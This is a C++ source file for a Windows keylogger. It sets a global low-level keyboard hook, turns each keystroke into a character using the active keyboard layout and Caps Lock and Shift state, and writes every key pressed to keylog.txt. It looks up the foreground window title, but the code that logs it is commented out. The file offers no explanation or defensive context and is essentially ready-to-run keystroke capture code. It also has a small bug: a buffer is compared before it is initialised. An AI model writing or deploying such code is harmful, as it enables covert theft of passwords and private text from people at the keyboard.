#include <iostream>
#include <Windows.h>
#include <time.h>
#include <fstream>

#pragma warning(disable:4996);
#pragma warning(disable:4703);

using namespace std;

int Save(int key);

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

int Save(int key)
{
    char prevProg[256];
    if (key == 1 || key == 2)
    {
        return 0;
    }

    HWND foreground = GetForegroundWindow();

    DWORD threadId;

    HKL keyboardLayout;

    if (foreground)
    {
        threadId = GetWindowThreadProcessId(foreground, NULL);

        keyboardLayout = GetKeyboardLayout(threadId);

        /*wchar_t*/ char crrProg[256];

        GetWindowText(foreground, crrProg, 256);

        if (strcmp(crrProg, prevProg) != 0)
        {
            strcpy(prevProg, crrProg);
            time_t t = time(NULL);
            struct tm* tm = localtime(&t);
            char c[64];
            strftime(c, sizeof(c), "%c", tm);
            //file << "\n\n\n[Program: " << crrProg << " DateTime: " << c << "]";
        }
    }

    cout << key << endl;

    char crrKey;
    bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
    if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
        (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
        (GetKeyState(VK_LSHIFT) & 0x1000) != 0)
    {
        lower = !lower;
    }
    crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

    if (!lower)
    {
        crrKey = tolower(crrKey);
    }

    file << char(crrKey);

    file.flush();

    return 0;
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

            Save(kbStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
    remove("keylog.txt");
    file.open("keylog.txt", ios_base::app);

    ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 1);
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
    {
        MessageBox(NULL, "w", "e", MB_ICONERROR);
    }

    MSG message;

    while (true)
    {
        GetMessage(&message, NULL, 0, 0);
    }

}